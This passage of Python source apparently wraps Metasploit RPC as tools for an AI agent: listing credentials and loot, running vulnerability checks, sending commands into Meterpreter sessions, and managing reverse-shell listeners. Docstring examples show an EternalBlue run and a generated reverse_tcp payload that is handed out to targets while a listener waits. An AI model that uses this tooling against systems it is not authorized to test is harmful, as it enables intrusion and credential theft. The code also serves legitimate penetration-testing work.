        workspace,
        addresses=[host] if host else None,
        ports=ports,
        proto=proto,
    )


@annotated_tool
async def list_vulnerabilities(
    workspace: Optional[str] = None, host: Optional[str] = None
) -> Dict[str, Any]:
    """List vulnerabilities recorded in the workspace database (read-only).

    Args:
        workspace: Optional workspace name.
        host: Optional host address to filter by.

    Returns:
        Dict with status, workspace, count, and a ``vulns`` list (host, name,
        references such as CVE identifiers).
    """
    return await _db_intel("db.vulns", "vulns", workspace, addresses=[host] if host else None)


@annotated_tool
async def list_notes(
    workspace: Optional[str] = None, host: Optional[str] = None, ntype: Optional[str] = None
) -> Dict[str, Any]:
    """List notes recorded in the workspace database (read-only).

    Args:
        workspace: Optional workspace name.
        host: Optional host address to filter by.
        ntype: Optional note type filter.

    Returns:
        Dict with status, workspace, count, and a ``notes`` list (host, type, data).
    """
    return await _db_intel(
        "db.notes", "notes", workspace, addresses=[host] if host else None, ntype=ntype
    )


@annotated_tool
async def list_credentials(workspace: Optional[str] = None) -> Dict[str, Any]:
    """List credentials recorded in the workspace database (read-only).

    Args:
        workspace: Optional workspace name.

    Returns:
        Dict with status, workspace, count, and a ``creds`` list (associated
        host/service, public and private components).
    """
    return await _db_intel("db.creds", "creds", workspace)


@annotated_tool
async def list_loot(workspace: Optional[str] = None, host: Optional[str] = None) -> Dict[str, Any]:
    """List loot recorded in the workspace database (read-only).

    Args:
        workspace: Optional workspace name.
        host: Optional host address to filter by.

    Returns:
        Dict with status, workspace, count, and a ``loots`` list (host, type,
        stored path/name).
    """
    return await _db_intel("db.loots", "loots", workspace, addresses=[host] if host else None)


def _map_check_code(code: str) -> str:
    """Map a Metasploit check ``code`` to a coarse, structured check state."""
    code = (code or "").lower()
    if code in ("vulnerable", "appears", "detected"):
        return "vulnerable"
    if code == "safe":
        return "safe"
    if code == "unsupported":
        return "unsupported"
    return "unknown"


@annotated_tool
async def check_vulnerability(
    module: str,
    options: Union[Dict[str, Any], str],
    module_type: str = "exploit",
    timeout_seconds: int = 60,
    ctx: Optional[Context] = None,
) -> Dict[str, Any]:
    """Run a module's non-destructive ``check`` against a target (no exploitation).

    Runs Metasploit's ``check`` method only — it never fires the exploit, delivers
    a payload, or opens a session. Use it to assess whether a target appears
    vulnerable before deciding to run an exploit.

    Args:
        module: Module name/path (e.g. 'windows/smb/ms17_010_eternalblue').
        options: Module options (dict or "K=V,K=V" string). Must include the
            target (e.g. RHOSTS).
        module_type: Module type; almost always 'exploit' (also 'auxiliary').
        timeout_seconds: Max seconds to wait for the check result (capped at 120).

    Returns:
        Dict with check_state (vulnerable/safe/unsupported/unknown), the raw
        check code and message, and session_created=False.
    """
    timeout_seconds = min(timeout_seconds, MAX_TOOL_TIMEOUT_SECONDS)
    try:
        client = get_msf_client()
    except ConnectionError as e:
        return {"status": "error", "error": "not_initialized", "message": str(e)}

    try:
        module_obj = await _get_module_object(module_type, module)
    except InvalidModuleError as e:
        return {"status": "error", "message": str(e)}
    except Exception as e:
        return {"status": "error", "message": f"Error loading module '{module}': {e}"}

    module_fullname = getattr(module_obj, "fullname", f"{module_type}/{module}")

    try:
        module_options = _parse_options_gracefully(options)
    except ValueError as e:
        return {"status": "error", "message": f"Invalid options format: {e}"}

    # _set_module_options applies the control-character injection guard and
    # reports missing/invalid options with a clear error.
    try:
        await _set_module_options(module_obj, module_options, module_type=module_type)
    except ValueError as e:
        return {"status": "error", "error": "invalid_options", "message": str(e)}

    # module_obj.check() runs ONLY the check method (RPC module.check). For
    # exploit modules pymetasploit3 sets DisablePayloadHandler, so no payload is
    # delivered and no session is created — this path cannot fire the exploit.
    try:
        check_start = await asyncio.to_thread(lambda: module_obj.check())
    except MsfRpcError as e:
        return {"status": "error", "error": "rpc_error", "message": f"Check failed to start: {e}"}
    except Exception as e:
        return {"status": "error", "message": f"Check failed to start: {e}"}

    check_start = _decode_rpc(check_start)
    if isinstance(check_start, dict) and check_start.get("error"):
        return {
            "status": "error",
            "error": "check_failed",
            "message": check_start.get("error_message")
            or check_start.get("error_string")
            or "Check could not be started.",
        }
    uuid = check_start.get("uuid") if isinstance(check_start, dict) else None
    if not uuid:
        return {
            "status": "error",
            "error": "unsupported",
            "message": f"Module '{module_fullname}' did not return a check job (check may be unsupported).",
        }

    # Poll module.results[uuid] until the check completes.
    loop = asyncio.get_event_loop()
    deadline = loop.time() + timeout_seconds
    while loop.time() < deadline:
        res = _decode_rpc(
            await asyncio.to_thread(lambda: client.call("module.results", [str(uuid)]))
        )
        state = str(res.get("status", "")).lower() if isinstance(res, dict) else ""
        if state in ("completed", "complete"):
            result = res.get("result") if isinstance(res.get("result"), dict) else {}
            code = str(result.get("code", res.get("code", "")))
            return {
                "status": "success",
                "module": module_fullname,
                "check_state": _map_check_code(code),
                "code": code or "unknown",
                "message": result.get("message") or res.get("message") or "",
                "session_created": False,
            }
        if state in ("errored", "error", "failed"):
            return {
                "status": "error",
                "error": "check_failed",
                "module": module_fullname,
                "message": res.get("error") or "Check reported an error.",
            }
        await asyncio.sleep(0.5)

    return {
        "status": "timeout",
        "module": module_fullname,
        "message": f"Check did not complete within {timeout_seconds}s.",
        "execution_id": str(uuid),
    }


@annotated_tool
async def get_module_results(execution_id: str) -> Dict[str, Any]:
    """Retrieve results/status for an asynchronously launched module execution.

    Pass the ``uuid`` returned by a module-executing tool (run_exploit,
    run_auxiliary_module, run_post_module, check_vulnerability) to poll its
    accumulated output and completion status.

    Args:
        execution_id: The execution/job UUID returned at launch time.

    Returns:
        Dict with execution_status (completed / running / errored) and the
        collected result, or a structured not-found error for an unknown id.
    """
    if not execution_id:
        return {"status": "error", "error": "not_found", "message": "No execution id provided."}
    try:
        client = get_msf_client()
    except ConnectionError as e:
        return {"status": "error", "error": "not_initialized", "message": str(e)}

    try:
        res = _decode_rpc(
            await asyncio.wait_for(
                asyncio.to_thread(lambda: client.call("module.results", [str(execution_id)])),
                timeout=RPC_CALL_TIMEOUT,
            )
        )
    except asyncio.TimeoutError:
        return {"status": "error", "error": "timeout", "message": "RPC did not respond in time."}
    except MsfRpcError as e:
        return {"status": "error", "error": "rpc_error", "message": f"Metasploit RPC error: {e}"}

    if not isinstance(res, dict) or not res:
        return {
            "status": "error",
            "error": "not_found",
            "message": f"No results found for execution id '{execution_id}'.",
        }

    state = str(res.get("status", "")).lower()
    if state in ("completed", "complete"):
        return {
            "status": "success",
            "execution_id": execution_id,
            "execution_status": "completed",
            "result": res.get("result"),
        }
    if state in ("errored", "error", "failed"):
        return {
            "status": "success",
            "execution_id": execution_id,
            "execution_status": "errored",
            "error": res.get("error") or res.get("error_message"),
        }
    # Anything else (typically "running") — return whatever partial data exists.
    return {
        "status": "success",
        "execution_id": execution_id,
        "execution_status": state or "running",
        "result": res.get("result"),
    }


@annotated_tool
@dangerous_tool
async def send_session_command(
    session_id: int,
    command: str,
    timeout_seconds: int = SESSION_COMMAND_TIMEOUT,
    inactivity_timeout_seconds: int = DEFAULT_SESSION_INACTIVITY_TIMEOUT,
    ctx: Optional[Context] = None,
) -> Dict[str, Any]:
    """
    Send a command to an active Metasploit session (Meterpreter or Shell) and get output.
    Uses prompt-aware read loops for both Meterpreter and shell sessions.
    The agent is responsible for parsing the raw output.

    In Meterpreter mode, to run a shell command, run `shell` to enter the shell mode first.
    To exit shell mode and return to Meterpreter, run `exit`.

    Args:
        session_id: ID of the target session.
        command: Command string to execute in the session.
        timeout_seconds: Maximum total time to wait for the command to complete (max: 120s, values above are capped).
        inactivity_timeout_seconds: Maximum idle time (no new output) before considering command complete
                                    (max: 120s, values above are capped).
        ctx: MCP Context for progress reporting (optional, injected by FastMCP).

    Returns:
        Dictionary with status ('success', 'empty', 'error', 'timeout', 'busy'), raw command output,
        elapsed_seconds, completion reason, read telemetry (chunks_read/bytes_read),
        and any surfaced meterpreter_errors.
        A 'busy' status means another command is already running on this session — retry after a delay.
    """
    # Cap timeout_seconds at MAX_TOOL_TIMEOUT_SECONDS (120s)
    if timeout_seconds > MAX_TOOL_TIMEOUT_SECONDS:
        logger.warning(
            f"timeout_seconds {timeout_seconds}s exceeds max {MAX_TOOL_TIMEOUT_SECONDS}s, capping to {MAX_TOOL_TIMEOUT_SECONDS}s"
        )
        timeout_seconds = MAX_TOOL_TIMEOUT_SECONDS
    if inactivity_timeout_seconds > MAX_TOOL_TIMEOUT_SECONDS:
        logger.warning(
            f"inactivity_timeout_seconds {inactivity_timeout_seconds}s exceeds max {MAX_TOOL_TIMEOUT_SECONDS}s, "
            f"capping to {MAX_TOOL_TIMEOUT_SECONDS}s"
        )
        inactivity_timeout_seconds = MAX_TOOL_TIMEOUT_SECONDS

    client = get_msf_client()
    logger.info(f"Sending command to session {session_id}: '{command}'")
    session_id_str = str(session_id)

    # Acquire per-session lock to prevent concurrent access to the same session
    session_lock = await _get_session_lock(session_id_str)
    try:
        await asyncio.wait_for(session_lock.acquire(), timeout=SESSION_LOCK_WAIT_TIMEOUT)
    except asyncio.TimeoutError:
        logger.warning(
            f"Session {session_id} is busy (lock held for >{SESSION_LOCK_WAIT_TIMEOUT}s). "
            f"Command '{command}' rejected — agent should retry."
        )
        return {
            "status": "busy",
            "message": (
                f"Session {session_id} is currently in use by another command. "
                f"Waited {SESSION_LOCK_WAIT_TIMEOUT}s. Please retry after a brief delay."
            ),
            "reason": "busy",
            "elapsed_seconds": 0.0,
            "output": "",
        }

    # Report initial progress if ctx available
    if ctx:
        await ctx.report_progress(
            progress=0,
            total=100,
            message=f"Sending command to session {session_id}: {command[:50]}...",
        )

    # Use keep-alive for potentially long-running session commands
    keepalive = get_keepalive_manager(
        ctx, operation_name=f"Session {session_id} command", initial_progress=5, max_progress=90
    )

    try:
        await keepalive.start()

        # --- Get Session Info and Object ---
        logger.info(f"Retrieving session {session_id} information and object")
        start_time = asyncio.get_event_loop().time()

        current_sessions = await _list_sessions_str_keys(client)
        session_list_duration = asyncio.get_event_loop().time() - start_time

        if session_id_str not in current_sessions:
            logger.error(
                f"Session {session_id} not found in {len(current_sessions)} active sessions "
                f"(retrieved in {session_list_duration:.1f}s)"
            )
            await _cleanup_session_lock(session_id_str)
            return {
                "status": "error",
                "message": f"Session {session_id} not found.",
                "reason": "error",
                "elapsed_seconds": 0.0,
                "output": "",
            }

        session_info = current_sessions[session_id_str]
        session_type = (
            session_info.get("type", "unknown").lower()
            if isinstance(session_info, dict)
            else "unknown"
        )
        target_host = session_info.get("target_host", "unknown")
        logger.info(f"Session {session_id} found: type={session_type}, target={target_host}")

        session_obj_start = asyncio.get_event_loop().time()
        session = await _get_session_object_from_map(
            client=client,
            sessions_by_str_id=current_sessions,
            session_id_str=session_id_str,
        )
        session_obj_duration = asyncio.get_event_loop().time() - session_obj_start

        if not session:
            logger.error(
                f"Failed to get session object for existing session {session_id} "
                f"after {session_obj_duration:.1f}s"
            )
            return {
                "status": "error",
                "message": f"Error retrieving session {session_id} object.",
                "reason": "error",
                "elapsed_seconds": 0.0,
                "output": "",
            }

        logger.debug(f"Session object retrieved in {session_obj_duration:.1f}s")

        # --- Execute Command Based on Type ---
        output = ""
        status = "error"  # Default status
        message = "Command execution failed or type unknown."
        reason = "error"
        elapsed_seconds = 0.0
        chunks_read = 0
        bytes_read = 0
        meterpreter_errors: List[str] = []

        if session_type == "meterpreter":
            if session_shell_type.get(session_id_str) is None:
                session_shell_type[session_id_str] = "meterpreter"

            current_mode = session_shell_type[session_id_str]
            logger.info(
                f"Executing Meterpreter command '{command}' on session {session_id} "
                f"(current mode: {current_mode}, timeout: {timeout_seconds}s)"
            )

            command_start_time = asyncio.get_event_loop().time()
            try:
                if command == "shell":
                    if session_shell_type[session_id_str] == "meterpreter":
                        logger.info(
                            f"Switching session {session_id} from meterpreter to shell mode"
                        )
                        output = await asyncio.wait_for(
                            asyncio.to_thread(
                                lambda: session.run_with_output(command, end_strs=["created."])
                            ),
                            timeout=timeout_seconds,
                        )
                        session_shell_type[session_id_str] = "shell"
                        shell_preamble = await asyncio.to_thread(lambda: session.read()) or ""
                        if shell_preamble:
                            logger.debug(
                                "Captured shell entry preamble for session %s: %s",
                                session_id,
                                shell_preamble.strip(),
                            )
                            output = f"{output}{shell_preamble}"
                            chunks_read = 1
                        bytes_read = len(output)
                        status = "success"
                        message = "Session switched to shell mode."
                        reason = "prompt"
                        elapsed_seconds = asyncio.get_event_loop().time() - command_start_time
                        logger.info(f"Session {session_id} successfully switched to shell mode")
                    else:
                        output = "You are already in shell mode."
                        status = "success"
                        message = "Session already in shell mode."
                        reason = "mode"
                        elapsed_seconds = asyncio.get_event_loop().time() - command_start_time
                        logger.debug(f"Session {session_id} already in shell mode")
                elif command == "exit":
                    if session_shell_type[session_id_str] == "meterpreter":
                        output = "You are already in meterpreter mode. No need to exit."
                        status = "success"
                        message = "Session already in meterpreter mode."
                        reason = "mode"
                        elapsed_seconds = asyncio.get_event_loop().time() - command_start_time
                        logger.debug(f"Session {session_id} already in meterpreter mode")
                    else:
                        logger.info(
                            f"Switching session {session_id} from shell to meterpreter mode"
                        )
                        await asyncio.wait_for(
                            asyncio.to_thread(lambda: session.read()),  # Clear buffer
                            timeout=timeout_seconds,
                        )
                        await asyncio.wait_for(
                            asyncio.to_thread(lambda: session.detach()), timeout=timeout_seconds
                        )
                        session_shell_type[session_id_str] = "meterpreter"
                        status = "success"
                        message = "Session switched to meterpreter mode."
                        reason = "mode"
                        elapsed_seconds = asyncio.get_event_loop().time() - command_start_time
                        logger.info(
                            f"Session {session_id} successfully switched to meterpreter mode"
                        )
                elif current_mode == "shell":
                    logger.debug(f"Executing shell-mode command via Meterpreter session: {command}")
                    shell_result = await _drive_shell_command(
                        session=session,
                        command=command,
                        timeout_seconds=timeout_seconds,
                        inactivity_timeout_seconds=inactivity_timeout_seconds,
                        session_id=session_id,
                    )
                    output = shell_result.get("output", "")
                    status = shell_result.get("status", "error")
                    message = shell_result.get("message", "Shell command failed.")
                    reason = shell_result.get("reason", "error")
                    elapsed_seconds = shell_result.get("elapsed_seconds", 0.0)
                    chunks_read = shell_result.get("chunks_read", 0)
                    bytes_read = shell_result.get("bytes_read", len(output))
                    meterpreter_errors = shell_result.get("meterpreter_errors", [])
                else:
                    logger.debug(f"Executing standard Meterpreter command: {command}")
                    meterpreter_result = await _drive_meterpreter_command(
                        session=session,
                        command=command,
                        timeout_seconds=timeout_seconds,
                        inactivity_timeout_seconds=inactivity_timeout_seconds,
                        session_id=session_id,
                    )
                    output = meterpreter_result.get("output", "")
                    status = meterpreter_result.get("status", "error")
                    message = meterpreter_result.get("message", "Meterpreter command failed.")
                    reason = meterpreter_result.get("reason", "error")
                    elapsed_seconds = meterpreter_result.get("elapsed_seconds", 0.0)
                    chunks_read = meterpreter_result.get("chunks_read", 0)
                    bytes_read = meterpreter_result.get("bytes_read", len(output))
                    meterpreter_errors = meterpreter_result.get("meterpreter_errors", [])

                if elapsed_seconds <= 0:
                    elapsed_seconds = asyncio.get_event_loop().time() - command_start_time
                logger.info(
                    f"Meterpreter command '{command}' finished with status={status} "
                    f"reason={reason} in {elapsed_seconds:.1f}s "
                    f"(output length: {len(output)} chars)"
                )
            except asyncio.TimeoutError:
                status = "timeout"
                reason = "timeout"
                elapsed_seconds = asyncio.get_event_loop().time() - command_start_time
                message = f"Meterpreter command timed out after {timeout_seconds} seconds."
                logger.warning(f"Command '{command}' timed out on Meterpreter session {session_id}")
                try:
                    output = await asyncio.to_thread(lambda: session.read()) or ""
                    bytes_read = len(output)
                    meterpreter_errors = [
                        line.strip() for line in METERPRETER_ERROR_RE.findall(output)
                    ]
                except Exception as read_err:
                    logger.warning(
                        f"Final Meterpreter read failed after timeout on session {session_id}: {read_err}"
                    )
            except (MsfRpcError, Exception) as run_err:
                logger.error(
                    f"Error during Meterpreter command execution for '{command}': {run_err}"
                )
                message = f"Error executing Meterpreter command: {run_err}"
                reason = "error"
                elapsed_seconds = asyncio.get_event_loop().time() - command_start_time
                try:
                    output = await asyncio.to_thread(lambda: session.read()) or ""
                    bytes_read = len(output)
                    meterpreter_errors = [
                        line.strip() for line in METERPRETER_ERROR_RE.findall(output)
                    ]
                except Exception as read_err:
                    logger.warning(
                        f"Final Meterpreter read failed after error on session {session_id}: {read_err}"
                    )

        elif session_type == "shell":
            logger.info(
                f"Executing shell command '{command}' on session {session_id} "
                f"(timeout: {timeout_seconds}s, inactivity: {inactivity_timeout_seconds}s)"
            )
            shell_result = await _drive_shell_command(
                session=session,
                command=command,
                timeout_seconds=timeout_seconds,
                inactivity_timeout_seconds=inactivity_timeout_seconds,
                session_id=session_id,
            )
            output = shell_result.get("output", "")
            status = shell_result.get("status", "error")
            message = shell_result.get("message", "Shell command failed.")
            reason = shell_result.get("reason", "error")
            elapsed_seconds = shell_result.get("elapsed_seconds", 0.0)
            chunks_read = shell_result.get("chunks_read", 0)
            bytes_read = shell_result.get("bytes_read", len(output))
            meterpreter_errors = shell_result.get("meterpreter_errors", [])

        else:  # Unknown session type
            logger.warning(
                f"Cannot execute command: Unknown session type '{session_type}' for session {session_id}"
            )
            message = f"Cannot execute command: Unknown session type '{session_type}'."
            reason = "error"

        # Report completion progress if ctx available
        if ctx:
            await ctx.report_progress(
                progress=100, total=100, message=f"Session command completed: {status}"
            )
        return {
            "status": status,
            "message": message,
            "output": output,
            "reason": reason,
            "elapsed_seconds": elapsed_seconds,
            "chunks_read": chunks_read,
            "bytes_read": bytes_read,
            "meterpreter_errors": meterpreter_errors,
        }

    except MsfRpcError as e:
        if "Session ID is not valid" in str(e):
            logger.error(f"RPC Error: Session {session_id} is invalid: {e}")
            return {
                "status": "error",
                "message": f"Session {session_id} is not valid.",
                "reason": "error",
                "elapsed_seconds": 0.0,
                "output": "",
            }
        logger.error(f"MsfRpcError interacting with session {session_id}: {e}")
        return {
            "status": "error",
            "message": f"Error interacting with session {session_id}: {e}",
            "reason": "error",
            "elapsed_seconds": 0.0,
            "output": "",
        }
    except KeyError:  # May occur if session disappears between list and access
        logger.error(f"Session {session_id} likely disappeared (KeyError).")
        return {
            "status": "error",
            "message": f"Session {session_id} not found or disappeared.",
            "reason": "error",
            "elapsed_seconds": 0.0,
            "output": "",
        }
    except Exception as e:
        logger.exception(f"Unexpected error sending command to session {session_id}.")
        return {
            "status": "error",
            "message": f"Unexpected server error sending command: {e}",
            "reason": "error",
            "elapsed_seconds": 0.0,
            "output": "",
        }
    finally:
        session_lock.release()
        await keepalive.stop(send_completion=False)


# --- Job and Listener Management Tools ---


@annotated_tool
async def list_listeners() -> Dict[str, Any]:
    """
    List all active Metasploit jobs, categorizing exploit/multi/handler jobs as "handlers".

    This function returns both:
    - handlers: Active listeners (exploit/multi/handler) created by start_listener() or run_exploit()
    - other_jobs: Other background jobs (auxiliary modules, post-exploitation, etc.)

    Use this to check what listeners are currently active before starting new ones to avoid
    port conflicts. Each handler entry includes job_id, name, and datastore (with LHOST/LPORT).
    """
    client = get_msf_client()
    logger.info("Listing active listeners/jobs")
    try:
        logger.debug(f"Calling client.jobs.list with {RPC_CALL_TIMEOUT}s timeout...")
        jobs = await asyncio.wait_for(
            asyncio.to_thread(lambda: client.jobs.list), timeout=RPC_CALL_TIMEOUT
        )
        if not isinstance(jobs, dict):
            logger.error(f"Unexpected data type for jobs list: {type(jobs)}")
            return {
                "status": "error",
                "message": f"Unexpected data type for jobs list: {type(jobs)}",
            }

        logger.info(f"Retrieved {len(jobs)} active jobs from MSF.")
        handlers = {}
        other_jobs = {}

        for job_id, job_info in jobs.items():
            job_id_str = str(job_id)
            job_data = {
                "job_id": job_id_str,
                "name": "Unknown",
                "details": job_info,
            }  # Store raw info

            is_handler = False
            if isinstance(job_info, dict):
                job_data["name"] = job_info.get("name", "Unknown Job")
                job_data["start_time"] = job_info.get("start_time")  # Keep if useful
                datastore = job_info.get("datastore", {})
                if isinstance(datastore, dict):
                    job_data["datastore"] = datastore  # Include datastore

                # Primary check: module path in name or info
                job_name_or_info = (job_info.get("name", "") + job_info.get("info", "")).lower()
                if "exploit/multi/handler" in job_name_or_info:
                    is_handler = True
                # Secondary check: presence of typical handler options
                elif "payload" in datastore or ("lhost" in datastore and "lport" in datastore):
                    is_handler = True
                    logger.debug(
                        f"Job {job_id_str} identified as potential handler via datastore options."
                    )

            if is_handler:
                logger.debug(f"Categorized job {job_id_str} as a handler.")
                handlers[job_id_str] = job_data
            else:
                logger.debug(f"Categorized job {job_id_str} as non-handler.")
                other_jobs[job_id_str] = job_data

        return {
            "status": "success",
            "handlers": handlers,
            "other_jobs": other_jobs,
            "handler_count": len(handlers),
            "other_job_count": len(other_jobs),
            "total_job_count": len(jobs),
        }

    except asyncio.TimeoutError:
        error_msg = f"Timeout ({RPC_CALL_TIMEOUT}s) while listing jobs from Metasploit server. Server may be slow or unresponsive."
        logger.error(error_msg)
        return {"status": "error", "message": error_msg}
    except MsfRpcError as e:
        logger.error(f"Metasploit RPC error while listing jobs/handlers: {e}")
        return {"status": "error", "message": f"Metasploit RPC error: {e}"}
    except Exception as e:
        logger.exception("Unexpected error listing jobs/handlers.")
        return {"status": "error", "message": f"Unexpected server error listing jobs: {e}"}


@annotated_tool
@dangerous_tool
async def start_listener(
    payload: str,
    lhost: str,
    lport: int,
    additional_options: Optional[Union[Dict[str, Any], str]] = None,
    exit_on_session: bool = False,  # Option to keep listener running
    reverselistenerbindaddress: Optional[str] = None,
    reverselistenerbindport: Optional[int] = None,
    ctx: Optional[Context] = None,
) -> Dict[str, Any]:
    """
    Start a new Metasploit handler (exploit/multi/handler) as a background job.

    CRITICAL - WHEN TO USE THIS vs run_exploit():
    DO NOT use this function if you're about to call run_exploit() with a payload!
    The run_exploit() function AUTOMATICALLY creates its own listener when you provide
    payload_name and payload_options. Using both will cause port conflicts and failures.

    USE start_listener() ONLY FOR THESE SCENARIOS:
    1. Standalone listeners for manually generated payloads (from generate_payload tool)
       - Example: Generate a .exe payload, then start listener to catch it when executed
    2. Persistent listeners that must remain active across multiple connection attempts
       - Example: Setting up a handler before distributing payload files to multiple targets
    3. Listeners needed BEFORE running non-Metasploit attack tools
       - Example: Using external tools/scripts that connect back to Metasploit handlers
    4. Pre-staging listeners for multi-stage attacks where timing is critical
       - Example: Listener must exist before triggering external payload delivery

    DO NOT USE start_listener() when:
    - You're about to call run_exploit() with a payload - it handles the listener automatically
    - You're running any Metasploit exploit module - use run_exploit() instead

    EXAMPLE - CORRECT USAGE (standalone listener for generated payload):
        # Generate a payload executable
        result = await generate_payload('windows/meterpreter/reverse_tcp', 'exe',
                                       lhost='10.0.0.1', lport=4444)
        # Start listener to catch connections from that payload
        await start_listener('windows/meterpreter/reverse_tcp', '10.0.0.1', 4444)
        # Now distribute/execute the generated payload file elsewhere

    EXAMPLE - INCORRECT USAGE (conflicts with run_exploit):
        await start_listener('windows/meterpreter/reverse_tcp', '10.0.0.1', 4444)  # DON'T DO THIS
        await run_exploit('exploit/windows/smb/ms17_010_eternalblue',
                         options={'RHOSTS': '192.168.1.10'},
                         payload_name='windows/meterpreter/reverse_tcp',
                         payload_options={'LHOST': '10.0.0.1', 'LPORT': 4444})  # FAILS - port conflict!
        # CORRECT: Just use run_exploit() alone - it creates the listener automatically

    Args:
        payload: The payload to handle (e.g., 'windows/meterpreter/reverse_tcp').
        lhost: Listener host address (what the target connects to).
        lport: Listener port (1-65535) (what the target connects to).
        additional_options: Optional dict of additional payload options (e.g., {"LURI": "/path"})
                           or string format "LURI=/path,HandlerSSLCert=cert.pem". Prefer dict format.
        exit_on_session: If True, handler exits after first session. If False (default), it keeps running.
        reverselistenerbindaddress: Optional bind address for the handler (defaults to 0.0.0.0).
                                      Use this when LHOST differs from the interface to bind to (e.g., NAT/firewall).
        reverselistenerbindport: Optional bind port for the handler (defaults to LPORT).
                                   Use this when LPORT differs from the port to bind to (e.g., port forwarding).
        ctx: MCP Context for progress reporting (optional, injected by FastMCP).

    Returns:
        Dictionary with handler status (job_id) or error details.
    """
    # Set defaults for bind address and port
    bind_address = (
        reverselistenerbindaddress if reverselistenerbindaddress is not None else "0.0.0.0"
    )
    bind_port = reverselistenerbindport if reverselistenerbindport is not None else lport

    logger.info(
        f"Request to start listener for {payload} on {lhost}:{lport}. "
        f"Bind: {bind_address}:{bind_port}. ExitOnSession: {exit_on_session}"
    )

    if not (1 <= lport <= 65535):
        return {"status": "error", "message": "Invalid LPORT. Must be between 1 and 65535."}

    if reverselistenerbindport is not None and not (1 <= reverselistenerbindport <= 65535):
        return {
            "status": "error",
            "message": "Invalid ReverseListenerBindPort. Must be between 1 and 65535.",
        }

    # Validate bind address (async to avoid blocking event loop on socket operations)
    is_valid, error_msg = await validate_bind_address(bind_address)
    if not is_valid:
        return {"status": "error", "message": f"Invalid ReverseListenerBindAddress: {error_msg}"}

    # Check if the port is available before trying to bind
    port_available, port_error = await check_port_available(bind_port, bind_address)
    if not port_available:
        return {"status": "error", "message": f"Cannot start listener: {port_error}"}

    # Parse additional options gracefully
    try:
        parsed_additional_options = _parse_options_gracefully(additional_options)
    except ValueError as e:
        return {"status": "error", "message": f"Invalid additional_options format: {e}"}

    # exploit/multi/handler options
    module_options = {"ExitOnSession": exit_on_session}
    # Payload options (passed within the payload_spec)
    payload_options = parsed_additional_options
    payload_options["LHOST"] = lhost
    payload_options["LPORT"] = lport

    # Always set bind address to ensure 0.0.0.0 default (unless user specified otherwise)
    payload_options["ReverseListenerBindAddress"] = bind_address

    # Only set bind port if it differs from LPORT
    if bind_port != lport:
        payload_options["ReverseListenerBindPort"] = bind_port

    payload_spec = {"name": payload, "options": payload_options}

    # Report initial progress if ctx available
    if ctx:
        await ctx.report_progress(
            progress=0, total=100, message=f"Starting listener: {payload} on {lhost}:{lport}"
        )

    # Use keep-alive for listener startup
    keepalive = get_keepalive_manager(
        ctx, operation_name=f"Start listener {payload}", initial_progress=10, max_progress=90
    )

    # Use the RPC helper to start the handler job
    try:
        await keepalive.start()

        result = await _execute_module_rpc(
            module_type="exploit",
            module_name="multi/handler",  # Use base name for helper
            module_options=module_options,
            payload_spec=payload_spec,
        )
    except InvalidModuleError as e:
        logger.warning(f"Payload '{payload}' not found for listener: {e}")
        return {"status": "error", "message": str(e)}
    finally:
        await keepalive.stop(send_completion=False)

    # Report completion if ctx available
    if ctx:
        await ctx.report_progress(
            progress=100, total=100, message=f"Listener started: {result.get('status', 'unknown')}"
        )

    # Rename status/message slightly for clarity
    if result.get("status") == "success":
        bind_info = (
            f" (binding to {bind_address}:{bind_port})"
            if (bind_address != lhost or bind_port != lport)
            else ""
        )
        result["message"] = (
            f"Listener for {payload} started as job {result.get('job_id')} on {lhost}:{lport}{bind_info}."
        )
    elif (
        result.get("status") == "warning"
    ):  # e.g., job started but polling failed (not applicable here but handle)
        result["message"] = (
            f"Listener job {result.get('job_id')} started, but encountered issues: {result.get('message')}"
        )
    else:  # Error case
        result["message"] = f"Failed to start listener: {result.get('message')}"

    return result


@annotated_tool
@dangerous_tool
async def stop_job(job_id: int) -> Dict[str, Any]:
    """
    Stop a running Metasploit job (handler or other). Verifies disappearance.
    """
    client = get_msf_client()
    logger.info(f"Attempting to stop job {job_id}")
    job_id_str = str(job_id)
    job_name = "Unknown"

    try:
        # Check if job exists and get name
        jobs_before = await asyncio.to_thread(lambda: client.jobs.list)
        if job_id_str not in jobs_before:
            logger.error(f"Job {job_id} not found, cannot stop.")
            return {"status": "error", "message": f"Job {job_id} not found."}
        if isinstance(jobs_before.get(job_id_str), dict):
            job_name = jobs_before[job_id_str].get("name", "Unknown Job")

        # Attempt to stop the job
        logger.debug(f"Calling jobs.stop({job_id_str})")
        stop_result_str = await asyncio.to_thread(lambda: client.jobs.stop(job_id_str))
        logger.debug(f"jobs.stop() API call returned: {stop_result_str}")

        # Verify job stopped by checking list again
        await asyncio.sleep(1.0)  # Give MSF time to process stop
        jobs_after = await asyncio.to_thread(lambda: client.jobs.list)
        job_stopped = job_id_str not in jobs_after

        if job_stopped:
            logger.info(
                f"Successfully stopped job {job_id} ('{job_name}') - verified by disappearance"
            )
            return {
                "status": "success",
                "message": f"Successfully stopped job {job_id} ('{job_name}')",
                "job_id": job_id,
                "job_name": job_name,
                "api_result": stop_result_str,
            }
        else:
            # Job didn't disappear. The API result string might give a hint, but is unreliable.
            logger.error(
                f"Failed to stop job {job_id}. Job still present after stop attempt. API result: '{stop_result_str}'"
            )
            return {
                "status": "error",
                "message": f"Failed to stop job {job_id}. Job may still be running. API result: '{stop_result_str}'",
                "job_id": job_id,
                "job_name": job_name,
                "api_result": stop_result_str,
            }

    except MsfRpcError as e:
        logger.error(f"MsfRpcError stopping job {job_id}: {e}")
        return {"status": "error", "message": f"Error stopping job {job_id}: {e}"}
    except Exception as e:
        logger.exception(f"Unexpected error stopping job {job_id}.")
        return {"status": "error", "message": f"Unexpected server error stopping job {job_id}: {e}"}


@annotated_tool
@dangerous_tool
async def kill_all_handler_jobs() -> Dict[str, Any]:
    """
    Kill all active handler jobs (exploit/multi/handler).
    Useful for cleaning up after failed exploits or test runs.

    Returns:
        Dictionary with status, count of killed jobs, and details.
    """
    client = get_msf_client()
    logger.info("Killing all handler jobs to release ports")

    try:
        # Get all active jobs
        jobs = await asyncio.to_thread(lambda: client.jobs.list)

        if not jobs:
            logger.info("No active jobs to kill")
            return {
                "status": "success",
                "message": "No active jobs found",
                "handlers_killed": 0,
                "total_jobs": 0,
            }

        logger.info(f"Found {len(jobs)} active job(s)")

        # Find handler jobs
        handler_jobs = {}
        for job_id, job_info in jobs.items():
            if isinstance(job_info, dict):
                job_name = job_info.get("name", "").lower()
                # Check if it's a handler job
                if "exploit/multi/handler" in job_name or "handler" in job_name:
                    handler_jobs[job_id] = job_info
                    logger.debug(f"Found handler job {job_id}: {job_info.get('name')}")

        if not handler_jobs:
            logger.info("No handler jobs found")
            return {
